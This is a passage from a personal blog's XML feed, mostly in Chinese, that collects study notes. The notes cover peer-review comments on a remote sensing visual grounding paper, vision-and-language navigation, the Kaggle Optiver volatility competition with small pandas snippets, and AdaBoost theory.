“来指代 “查询通道注意”，但在图 1 中却使用了 “QCA”，这容易引起混淆。<br>(6) 我建议作者在不同等式的末尾加上逗号或句号。</p><p>Reviewer: 2</p><p>Comments to the Author<br>Overall, this is a well-structured paper, but there are several writing issues. The paper focuses on the latest RSVG task and proposes a novel multi-stage synergistic aggregation module that effectively aggregates visual and textual contexts to facilitate the learning of multi-scale multimodal features. However, the introduction of the generative paradigm, which is the innovative aspect, may not be appropriate. The reviewer thinks this manuscript is not acceptable without major revisions.</p><h2 id="standardize-writing-precise-formula-symbols"><a href="#standardize-writing-precise-formula-symbols" class="headerlink" title="standardize writing, precise formula symbols"></a>standardize writing, precise formula symbols</h2><ol><li><p>Is the ‘Auto-Regressive Transformer’ in Figure 1(a) the same module as the ‘Generative Transformer’ in (b)? Please ensure consistent expression. Section II.C is referred to as the ‘Auto-regressive Generative Transformer’.</p></li><li><p>In Section II, the first appearance of the symbol “i” in <i-t>i needs to be explained clearly; it seems inconsistent with the meaning in formulas (2), (3), (4), and (5). In the section “Feature Aggregation,” it is stated that “i presents the i-th stage of aggregation.”.</i-t></p></li><li><p>It is mentioned in the letter that “if there are n queries associated with the same image, then the image forms n samples with these n queries.” And in “The embedding set can be presented as ={[CLS], t1, t2, t3, …, tn},” the symbol “n” is used, which should not represent the same meaning. Formulas (6) and (7) also use “n,” please carefully check and differentiate symbols with different meanings.</p></li><li><p>Section “Transformer Decoder” is poorly written. This section references formulas (9) and (12), but it is clear that formula (12) does not exist. So there is an error, please modify it carefully. What does “Cxy” mean in formula (8)? Does it have the same meaning as “Cxy” in Figure 1(a)? What is the meaning of “kwh”? What is the difference between “Cbins” and “Cˆbins”? What is the difference between “Cxy” and “Cˆxy”? What is “Sc”? What are s1, s2, s3, s4? They are not explained clearly.</p></li><li><p>There is a grammar error: “The result sequence Cˆbins predicted by the decoder can be inverse quantized with (12) to obtain the floating-point result, we use Cbins.” This sentence is incorrect as there are complete sentences before and after the comma. To clarify, this does NOT means expressions in other text are right. Please thoroughly check the grammar in the paper.</p></li><li><p>Several symbols, such as “n,” “k,” etc., are not in italic font. Please carefully check and modify.</p></li><li><p>图 1(a)中的 “自回归变压器 “与(b)中的 “生成变压器 “是同一个模块吗？请确保表述一致。第 II.C 节称为 “自动回归生成变换器”。</p></li><li><p>在第 II 节中，<i-t>i 中第一次出现的符号 “i “需要解释清楚；它似乎与公式 (2)、(3)、(4) 和 (5) 中的含义不一致。在 “特征聚合 “一节中，”i 表示聚合的第 i 个阶段”。</i-t></p></li><li><p>信中提到，”如果有 n 个查询与同一幅图像相关联，那么图像就会与这 n 个查询形成 n 个样本”。而在 “嵌入集可以表示为 ={[CLS], t1, t2, t3, …, tn}”中，使用了符号 “n”，这不应该代表相同的含义。公式 (6) 和 (7) 也使用了 “n”，请仔细检查并区分不同含义的符号。</p></li><li><p>“变压器解码器 “一节写得不好。该节引用了公式 (9) 和 (12)，但显然不存在公式 (12)。因此存在错误，请仔细修改。公式（8）中的 “Cxy “是什么意思？与图 1(a)中的 “Cxy “含义相同吗？kwh” 的含义是什么？Cbins” 和 “Cˆbins” 有什么区别？Cxy” 和 “Cˆxy “有什么区别？什么是 “Sc”？什么是 s1、s2、s3、s4？ 没有解释清楚。</p></li><li><p>有一个语法错误： “解码器预测的结果序列 Cˆbins 可以用（12）进行反量化，得到浮点结果，我们使用 Cbins。这句话不正确，因为逗号前后都有完整的句子。需要说明的是，这并不意味着其他文本中的表达是正确的。请彻底检查论文中的语法。</p></li><li><p>有几个符号，如 “n”、”k “等，没有用斜体字。请仔细检查并修改。</p></li></ol><h2 id="novelty"><a href="#novelty" class="headerlink" title="novelty"></a>novelty</h2><ol><li>Contribution 2) mentions introducing the generation paradigm into the RSVG field. Please explain what exactly the generation paradigm means. In the abstract, it is mentioned as “generate discrete coordinates sequence in an auto-regressive manner,” but the MGVLF proposed in reference [17] also generates discrete coordinates through feature regression. This contribution point is not sufficient.</li></ol><h2 id="experiments"><a href="#experiments" class="headerlink" title="experiments"></a>experiments</h2><ol><li>In Section A, it is stated that “our framework achieves improved visual representation learning for small-scale objects.” How can you prove this through qualitative or quantitative results? Otherwise, it is difficult to draw this conclusion.</li></ol><h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><ol><li><p>Reference [17] constructs the DIOR-RSVG dataset, and the proposed method is named MGVLF. Please modify the entire letter and TABLE 1 accordingly. The Venue should be TGRS, not IEEE.</p></li><li><p>Is the ‘Prediction Head’ in Figure 1(a) the same as ‘MLP’ in (b)?</p></li><li><p>Refer to recent articles [1] on remote sensing vision-language task.<br>[1] Y. Yuan, Y. Zhan and Z. Xiong, “Parameter-Efficient Transfer Learning for Remote Sensing Image–Text Retrieval,” in IEEE Transactions on Geoscience and Remote Sensing, vol. 61, pp. 1-14, 2023, Art no. 5619014, doi: 10.1109/TGRS.2023.3308969.</p></li></ol><h2 id="新奇"><a href="#新奇" class="headerlink" title="新奇"></a>新奇</h2><ol><li>贡献 2）提到将生成范式引入 RSVG 领域。请解释一下生成范式的确切含义。摘要中提到 “以自动回归方式生成离散坐标序列”，但参考文献 [17] 中提出的 MGVLF 也是通过特征回归生成离散坐标的。这个贡献点还不够。</li></ol><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><ol><li>A 部分指出 “我们的框架改进了小尺度物体的视觉表征学习”。如何通过定性或定量结果来证明这一点？否则很难得出这一结论。</li></ol><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ol><li><p>参考文献 [17] 构建了 DIOR-RSVG 数据集，提出的方法被命名为 MGVLF。请相应修改整封信和表 1。地点应为 TGRS，而不是 IEEE。</p></li><li><p>图 1(a)中的 “预测头 “与(b)中的 “MLP “是否相同？</p></li><li><p>参考最近关于遥感视觉语言任务的文章 [1]。<br>[1] Y. Yuan, Y. Zhan and Z. Xiong, “Parameter-Efficient Transfer Learning for Remote Sensing Image-Text Retrieval,” in IEEE Transactions on Geoscience and Remote Sensing, vol. 61, pp.</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Visual Grounding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Visual Grounding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨模态检索论文阅读合集</title>
      <link href="/2021/12/29/2021-12-29-%E8%B7%A8%E6%A8%A1%E6%80%81%E6%A3%80%E7%B4%A2%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E5%90%88%E9%9B%86/"/>
      <url>/2021/12/29/2021-12-29-%E8%B7%A8%E6%A8%A1%E6%80%81%E6%A3%80%E7%B4%A2%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>阅读的跨模态检索相关论文合集</p><a id="more"></a><h1 id="2022-03-16更新"><a href="#2022-03-16更新" class="headerlink" title="2022-03-16更新"></a>2022-03-16更新</h1><p>论文的note及总结在mendeley里，缺点是不好导出，有空手动搞出来再更新。</p><h1 id="梳理"><a href="#梳理" class="headerlink" title="梳理"></a>梳理</h1><h2 id="数据集和benchmark"><a href="#数据集和benchmark" class="headerlink" title="数据集和benchmark"></a>数据集和benchmark</h2><p>常用的是MSCOCO和Flickr30k数据集，数据量多，且图像：文本为1:5，操作空间大。<br>对性能评估的讨论基本是围绕Recall@k展开，其中I2T的Recall普遍比</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/paperswithcode_flickr.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>paperswithcode的检索Flickr30K数据集benchmark</p><h1 id="SCAN-Stacked-Cross-Attention-for-Image-Text-Matching-CVPR-2018"><a href="#SCAN-Stacked-Cross-Attention-for-Image-Text-Matching-CVPR-2018" class="headerlink" title="SCAN:Stacked Cross Attention for Image-Text Matching-CVPR 2018"></a>SCAN:Stacked Cross Attention for Image-Text Matching-CVPR 2018</h1>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CV </tag>
            
            <tag> Multimodal </tag>
            
            <tag> PreTraining </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A Survey of Restoration of Non-rigidly Distorted Image</title>
      <link href="/2021/12/17/2021-12-17-non-rigid_image_distorted_image_recovery/"/>
      <url>/2021/12/17/2021-12-17-non-rigid_image_distorted_image_recovery/</url>
      
        <content type="html"><![CDATA[<p>非刚性平面扰动图像恢复，应用：2D，3D，视频数据</p><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vison-Language-Navigation</title>
      <link href="/2021/08/01/2021-08-01-vqa2vln/"/>
      <url>/2021/08/01/2021-08-01-vqa2vln/</url>
      
        <content type="html"><![CDATA[<p>关于CVPR2021，VQA2VLN的tutorial的总结</p><a id="more"></a><p>tutorial原地址：<a href="https://vqa2vln-tutorial.github.io/" target="_blank" rel="noopener">CVPR 2021 Tutorial on “From VQA to VLN: Recent Advances in Vision-and-Language Research”</a>，本笔记总结一下在ppt里展示的VLN任务的内容，几位演讲者的视频还没看，毕竟有ppt和论文，概念理解应该不会有偏差</p><h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>浏览了一下，VLN其实是算一个在人机交互大背景下的Visual+Language的研究方向，其实和之前做的三维重建+导航有点关系，总而言之是2D和3D视觉方面的东西，下面稍微总结了下，后几个ppt还没看完，后面会追加该方向的论文链接和相关内容</p><h2 id="See-Communicate-Act"><a href="#See-Communicate-Act" class="headerlink" title="See, Communicate, Act"></a>See, Communicate, Act</h2><p>机器模拟人的几种模拟方式，基本是将机器在看（视觉）、交流（文本）、行动几种模式下提高智能化，现在在See和Communicate两种模式的比较有代表性领域就是Computer Vision和Nature Language Processing，还有视觉和自然语言相结合的领域，例如Image-Understanding任务。前几年利用视觉和自然语言实现的智能化是从比较独立的模块获取的信息，比如目标检测，获取物体在图像上的(位置, 类别)，给机器做一些什么任务，比如统计xx，预测人流量等。目前用结合See-Communicate(Vision-Language)的发展比较好的方向有VQA, Captioning,Text2Image Generation等。</p><ul><li>会议上提到的这个VLN领域的理念是<em>Connecting Vision and Language to Actions</em>, 将vision(2D,3D)、language和(行动/指令)联系起来，理解复杂场景，并对输入请求做出具体行动，相当于是Video Understanding下的子任务。</li></ul><h2 id="Embodied-AI"><a href="#Embodied-AI" class="headerlink" title="Embodied AI"></a>Embodied AI</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/EmbodiedAI.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>“Embodied AI is the field for solving AI problems for virtual robots that can move, see, speak, and interact in the virtual world.” 这是在page里的一个引言，关于实体AI(暂译)，就是让机器获得 视听说、行动、理解几种功能，集成算法达到一个接近人一样的智能体，从Internet AI 过渡到 Embodied AI，甚至是给AGI，Artificial General Intelligence打基础，有一个关于Embodied AI的survey：<br><a href="https://arxiv.org/pdf/2103.04918.pdf" target="_blank" rel="noopener">Duan et al., A survey of Embodied AI: From simulators to Research Tasks, 2021</a></p><h1 id="Vision-Language-Navigation"><a href="#Vision-Language-Navigation" class="headerlink" title="Vision-Language Navigation"></a>Vision-Language Navigation</h1><p>VLN是2018年提出的一个研究领域，当时的子标题是<strong>Vision-and-Language Navigation: Interpreting visually-grounded navigation instructions in real environments</strong>：在现实环境下，让机器理解基于视觉定位的导航指令。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/VLN.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>左下是人为给出的指令<br>通俗来讲VLN任务就是为了给机器人导航，有两个任务：<br>①如何理解现实场景<br>②对于给出的Instructions，如何理解并做出行动<br><strong>与3D视觉导航的区别</strong>（如自动驾驶使用的视觉SLAM、Radar等）</p><ul><li>3D-Navigation         : SLAM下从图像帧中处理得到点云判别障碍物、方位</li><li>Sensor-Navigation : 传感器获取的空间信息（Radar、Lidar等）    ，判别障碍物、方位<br>SLAM —&gt; PointCloud —&gt; direction<br>Sensor —&gt; Mesh —&gt; direction                </li><li>VL-Navigation          : Agent(摄像头)获取的视频信息，理解场景内容，并对指令做出行动，目前主要是在室内场景下研究导航任务</li></ul><p><strong>与VQA的区别</strong><br>VLN相对增加了动态视觉（相机运动）、长文本、测试集和训练集上的领域差距</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/VLN2VQA.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>domain gap指的是比如在室内场景下训练，在室外场景测试，效果可能就急剧下降，并且一个训练样本就可以是整个场景，（比如浙江大学的3D重建方法，NeuralRecon所用的Scannet数据）</p><h2 id="Indoor-VLN"><a href="#Indoor-VLN" class="headerlink" title="Indoor VLN"></a>Indoor VLN</h2><p>目前VLN主要是研究室内的导航任务，<br>室内导航任务的几种指令难度等级<br>    1. A到B的位移<br>    2.找东西（可见）<br>    3.找东西（不可见）<br>    4.向人有针对性的提问得到更详细的信息，用这些追加的信息找东西</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/IndoorVLN.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="Indoor-VLN-Challenges"><a href="#Indoor-VLN-Challenges" class="headerlink" title="Indoor VLN Challenges"></a>Indoor VLN Challenges</h2><p>Significant Appearance Variation，同一种物体有不同外观</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/c1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>Rich Linguistic Phenomena，丰富的语境 </p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/c2.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>Less Words, More Contents，文本所能表达的东西太少</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/c3.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="VLN-Models"><a href="#VLN-Models" class="headerlink" title="VLN Models"></a>VLN Models</h2><ul><li>Seq2seq (a golden baseline)<br>  • Speaker-follower</li><li>Attention Mechanism (something must try)<br>  • EnvDrop, Self-monitoring, OAAM </li><li>Transformer (this is all you need)<br>  • PREVALENT, Recurrent-Bert</li><li>Reinforcement Learning (Add-on)<br>  • RCM, Soft Expert</li></ul><h2 id="Datasets"><a href="#Datasets" class="headerlink" title="Datasets"></a>Datasets</h2><p>R2R 在214服务器上生成好了，从matterport模拟器得到的R2R任务 path distance 等<br>CVDN<br>NDH</p><h2 id="Metrics"><a href="#Metrics" class="headerlink" title="Metrics"></a>Metrics</h2><ul><li>Success / Oracle Success Rate (%)</li><li>Navigation Error (m)</li><li>SPL (Success weighted by Path Length) </li><li>CLS (Coverage weighted by Length Score)<br>  • Measuring fidelity to the reference path </li><li>nDTW (normalized Dynamic Time Warping) </li><li>SDTW (Success weighted by normalized Dynamic Time Warping)<h1 id="Addition"><a href="#Addition" class="headerlink" title="Addition"></a>Addition</h1></li></ul>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
            <tag> DL </tag>
            
            <tag> MultiMedia </tag>
            
            <tag> Vision </tag>
            
            <tag> NLP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Optiver Realized Volatility Prediction</title>
      <link href="/2021/07/01/2021-07-01-kaggle-LGB-optiver-realized-volatility-prediction/"/>
      <url>/2021/07/01/2021-07-01-kaggle-LGB-optiver-realized-volatility-prediction/</url>
      
        <content type="html"><![CDATA[<p>以后写kaggle尽量都用一些实用性的算法，该面向简历编程了，论文阅读笔记之类的以后都尽量用英语写</p><a id="more"></a><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>Optiver Realized Volatility Prediction Competition.<br>This kaggle project is about trying diff methods to predict the volatility of a trading floor for trading firms,The Accurate Volatility, which is essencial for their investing options.Also is an essencial data standard related to the price of underlying product.<br>IN short, We have to find the most effective approach to minus RMSPE.</p><h3 id="Given-Data"><a href="#Given-Data" class="headerlink" title="Given Data"></a>Given Data</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dataset</span><br><span class="line">├── book_test.parquet</span><br><span class="line">├── book_train.parquet</span><br><span class="line">├── trade_test.parquet</span><br><span class="line">└── trade_train.parquet</span><br></pre></td></tr></table></figure><p>Each folder contains stock_id=n<br><strong>trade</strong> [‘time_id’, ‘seconds_in_bucket’, ‘price’, ‘size’, ‘order_count’]<br><strong>book</strong> [‘time_id’, ‘seconds_in_bucket’, ‘bid_price1’, ‘ask_price1’, ‘bid_price2’, ‘ask_price2’, ‘bid_size1’, ‘ask_size1’, ‘bid_size2’, ‘ask_size2’],<br><strong>train</strong> [‘stock_id’,’time_id’,’target’]<br><strong>test</strong> [‘stock_id’,’time_id’,’row_id’]</p><h3 id="financial-concepts"><a href="#financial-concepts" class="headerlink" title="financial concepts"></a>financial concepts</h3><p>show case:</p><table><thead><tr><th align="center">bid</th><th align="center">price</th><th align="center">ask</th></tr></thead><tbody><tr><td align="center"></td><td align="center">151</td><td align="center">196</td></tr><tr><td align="center"></td><td align="center">150</td><td align="center">189</td></tr><tr><td align="center"></td><td align="center">149</td><td align="center">148</td></tr><tr><td align="center"></td><td align="center">148</td><td align="center">221</td></tr><tr><td align="center">251</td><td align="center">147</td><td align="center"></td></tr><tr><td align="center">351</td><td align="center">146</td><td align="center"></td></tr><tr><td align="center">300</td><td align="center">145</td><td align="center"></td></tr><tr><td align="center">20</td><td align="center">144</td><td align="center"></td></tr><tr><td align="center"><em>1.Content of an order book</em></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">- A list of buy or sell records sorted by price, which lists the number of shares being bid on or offered at each price point.</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">- in the case of given data,’bid’ means <em>How many shares the Buyer want to buy</em> , ‘ask’ means <em>How many shares Sellers offer</em>.</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><strong>EACH order book&amp;trade book belongs to 1 kind of stock</strong></td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><em>2.Trade procedure</em></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">- a TRADE HAPPENS when the shares of stock that seller S offers and buyer B bids  at the same price.</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">- B can up his/her intended price and buy the offered by S.</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><em>3.Liquidity</em></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">there’re some statistics standards for analyser to estimate the liquidity of an order book.</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">- WAP(weighted avaraged price)takes the price level and size of orders</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">$$wap = \frac{bidprice1<em>asksize1+askprice1</em>bidsize1}{asksize1+bidsize1}$$</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">Code for WAP caculation, add one column as ‘wap’</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">book_parquet[<span class="string">'wap'</span>] = </span><br><span class="line">(book_parquet[<span class="string">'bid_price1'</span>] * book_parquet[<span class="string">'ask_size1'</span>] + </span><br><span class="line">book_parquet[<span class="string">'ask_price1'</span>] * book_parquet[<span class="string">'bid_size1'</span>])</span><br><span class="line">/(book_parquet[<span class="string">'bid_size1'</span>]+ book_parquet[<span class="string">'ask_size1'</span>])</span><br></pre></td></tr></table></figure></td><td align="center"></td><td align="center"></td></tr></tbody></table><p><em>4.Log returns</em><br>another vital standard for comparing the price of a stock in yesterday and today<br>calling $S_t$ is the price of stock at time $t$ ,the log return is $r_{t1,t2}$,<br>$$r_{t_1, t_2} = \log{\frac{S_{t_2}}{S_{t_1}}}$$<br>Noticed <strong>The host wants competitors should use WAP to compute log returns, and assuming that log returns have 0 mean</strong><br>Then the Code for LogReturn is as follows and add it to book table.<br>Additionally we should expire the NaN row:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LogReturn</span><span class="params">(WAP)</span>:</span></span><br><span class="line"><span class="keyword">return</span> np.log(WAP)</span><br><span class="line">book_parquet[<span class="string">'logreturn'</span>] = LogReturn(book_parquet)</span><br><span class="line"><span class="comment">#expire NaN items</span></span><br><span class="line">book_parquet = book_parquet[~book_example[<span class="string">'log_return'</span>].isnull()]</span><br></pre></td></tr></table></figure><p><em>5.Realized Volatility</em><br>Volatility is described as ‘the annualized standard deviation of one year’s LogReturn’<br>$$\sigma = \sqrt{\sum\limits_t{r^2_{t-1,t}}}$$</p><p>For each stock data, we find that different stock have different volatility characteristics, So one column should be added as ‘stock_id’, using</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stock_id = i</span><br><span class="line">book_parquet.loc[:,<span class="string">'stock_id'</span>] = stock_id</span><br></pre></td></tr></table></figure><h2 id="Evaluation"><a href="#Evaluation" class="headerlink" title="Evaluation"></a>Evaluation</h2><p>The evaluation metric is Root Mean Square Percentage Error, as:<br>$$\text{RMSPE} = \sqrt{\frac{1}{n} \sum_{i=1}^{n} ((y_i - \hat{y}_i)/y_i)^2}$$<br>The formula above can be implemented as:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RMSPE</span><span class="params">(yhat, data)</span>:</span></span><br><span class="line">y = data.get_label()</span><br><span class="line">elements = ((y - yhat) / y) ** <span class="number">2</span></span><br><span class="line"><span class="keyword">return</span> float(np.sqrt(np.sum(elements) / len(y)))</span><br></pre></td></tr></table></figure><h2 id="Method-s"><a href="#Method-s" class="headerlink" title="Method(s)"></a>Method(s)</h2><p>I looked through the Discussion board, found most are using <em>XGBoost</em> and <em>LightGBT</em>, I get begin from  DataProcessing module and the baseline is implemented with XGBoost, LightGBT will be done later.</p><h3 id="data-processing"><a href="#data-processing" class="headerlink" title="data processing"></a>data processing</h3><p>First check how we should process the parquet file.<br><strong>Parquet</strong>  is a <a href="http://en.wikipedia.org/wiki/Column-oriented_DBMS" target="_blank" rel="noopener">columnar storage</a> format available to any project in the Hadoop ecosystem, regardless of the choice of data processing framework, data model or programming language.<br>Hoster provided code for process the columnar file.<br><strong>and, I’m goin to try to run this method and data on Spark</strong>, The code will be release later on github.<br>Process code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="APIs"><a href="#APIs" class="headerlink" title="APIs"></a>APIs</h2><p>you can use <a href="https://lightgbm.readthedocs.io/en/latest/pythonapi/lightgbm.plot_importance.html" target="_blank" rel="noopener">https://lightgbm.readthedocs.io/en/latest/pythonapi/lightgbm.plot_importance.html</a> to see the feature importance of your model.</p>]]></content>
      
      
      <categories>
          
          <category> kaggle </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
            <tag> kaggle </tag>
            
            <tag> Boosting </tag>
            
            <tag> xgboost </tag>
            
            <tag> GBDT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>统计学习笔记(后篇)</title>
      <link href="/2021/07/01/2021-07-01-statics_note/"/>
      <url>/2021/07/01/2021-07-01-statics_note/</url>
      
        <content type="html"><![CDATA[<p>接上一篇统计学习笔记，最近在做kaggle，用到了几种Boost，有机会把以前笔记剩余部分的补上了。</p><a id="more"></a><h2 id="Boosting"><a href="#Boosting" class="headerlink" title="Boosting"></a>Boosting</h2><p>Boosting类方法是将N个弱学习算法构建成一个相当于强学习算法的方法。例如用一套基本分类器按照不同的权重组合成一个强分类器，这些基本分类器之间有依赖关系，构成的最终分类器可以达到复杂的强分类器达到的效果，并且可以使用并行处理，时间效率比复杂模型更快。</p><p>在这里重点记录AdaBoost和XGBoost两个模型，也是实际应用中广泛使用的方法，最后会讨论效果和时间性能。</p><p>sklearn的ensemble里封装了<a href="https://scikit-learn.org/stable/modules/classes.html#module-sklearn.ensemble" target="_blank" rel="noopener">AdaBoostClassifier/AdaBoostRegressor</a>。</p><h3 id="Boosting类的算法原理"><a href="#Boosting类的算法原理" class="headerlink" title="Boosting类的算法原理"></a>Boosting类的算法原理</h3><ol><li>boosting的基本思想是选取弱学习器，可以是各种算法组合在一起用，也可用n个相同的算法，设定不同超参数。</li><li>组合方式，并行方式（Voting），串行（Cascading)。区别在于，并行方式是每个弱学习器给自己的结果，串行方式是第i+1个弱学习器只在第i个的置信度结果不够高时，对上一级的结果进行预测。</li></ol><h2 id="AdaBoost"><a href="#AdaBoost" class="headerlink" title="AdaBoost"></a>AdaBoost</h2><h3 id="Adaboost解决的问题"><a href="#Adaboost解决的问题" class="headerlink" title="Adaboost解决的问题"></a>Adaboost解决的问题</h3><p>Adaboosting如何实现自适应<br>(适应弱分类器各自的训练误差率)，由权值D实现，那么：</p><ol><li>每一轮如何改变训练数据的权值或者概率分布？</li></ol><ul><li><strong>提高被前一轮弱分类器错误分类的样本的权值，降低被正确分类样本的权值，权值改变依赖自己的权值更新策略，不同任务和训练集一般不同，必要时需要设计自己的更新策略</strong></li></ul><ol start="2"><li>如何将N个弱学习模型组合成一个强学习模型</li></ol><ul><li><strong>Adaboost采取加权voting，准确率误差小的学习器权重高，误差大的权重小</strong></li></ul><h3 id="Adaboost算法流程"><a href="#Adaboost算法流程" class="headerlink" title="Adaboost算法流程"></a>Adaboost算法流程</h3><p>&lt;!—&gt;<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/adaboost-algorithm.png" alt title>                </div>                <div class="image-caption"></div>            </figure><br>&lt;—&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">权重参数D，弱分类器个数</span><br></pre></td></tr></table></figure><p>算法机制很容易理解，就拿李航那本书上的-1和1做分类的问题，拆分成</p><ol><li>加法模型$f(x)=\sum{\beta_mb(x;\gamma_m)}$</li><li>损失函数</li><li>前向分布</li></ol><p>1.加法模型是指：有一系列基函数，其中基函数的变量$x$和某种系数$\gamma$，设有m次迭代，则每次迭代产生系数$\gamma_m$和基函数的系数$\beta_m$，产生$\beta_mb(x;\gamma_m)$，我们也可以把这个基函数成为分类器$G$，最终模型也可以写成$f(x)=\sum{\beta_mb(x;\gamma_m)}=\sum{\alpha_mG(x)_m}$</p><p>2.损失函数：由于含supervision，我们采取的损失函数可以采取大部分误差项或CE等损失函数<br>3.前向分布计算</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">func[]</span><br><span class="line">for i in range(m):</span><br><span class="line">    (beta,gamma) =</span><br><span class="line">        argmin(sum(Loss(y,f(x)+beta*G(x,gamma))))</span><br><span class="line">    func[] = func[] + beta*G()</span><br><span class="line">res = func[](x)</span><br></pre></td></tr></table></figure><p>在argmin的操作里，涉及到系数的计算，首先我们需要每次迭代时计算分类误差（以第m次迭代为例）$err_m=\sum{w_{m,i}I(G_m(x)!=y)}$，那么$\beta_m=0.5\ln{\frac{1-err_m}{err_m}}$,更新样本权重$D,w_{m+1,i}=\frac{w_{m,i}}{Z_m}exp(-\beta_mG_m(x)y_i),Z=\sum{-\beta_mG_m(x)y_i}$,为归一化因子。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">问题<span class="number">1.</span>为什么不能用神经网络一类的强分类器。</span><br><span class="line">因为adaboost是梯度算法，若果弱分类器太强，则会陷入局部最优。</span><br><span class="line"></span><br><span class="line">问题<span class="number">2.</span>当有不支持加权重的弱分类器时，如何解决。</span><br><span class="line">resampling样本</span><br><span class="line"></span><br><span class="line">问题<span class="number">3.</span>权重的作用</span><br><span class="line"><span class="number">1.</span>计算弱分类器的加权系数，训练弱分类器G</span><br><span class="line"><span class="number">2.</span></span><br><span class="line">问题<span class="number">4.</span>与random forest的区别</span><br><span class="line"><span class="number">1.</span>随机森林的每棵树独立做出决策，训练时没有先后顺序</span><br><span class="line"><span class="number">2.</span>adaboost的tree中，每个G以上一个的结果为输</span><br></pre></td></tr></table></figure><h2 id="EM"><a href="#EM" class="headerlink" title="EM"></a>EM</h2><h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><p>1.高斯混合分布，<br>2.隐变量，从高斯混合分布产生的变量</p>]]></content>
      
      
      <categories>
          
          <category> 数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Boost </tag>
            
            <tag> AdaBoost </tag>
            
            <tag> XGBoost </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
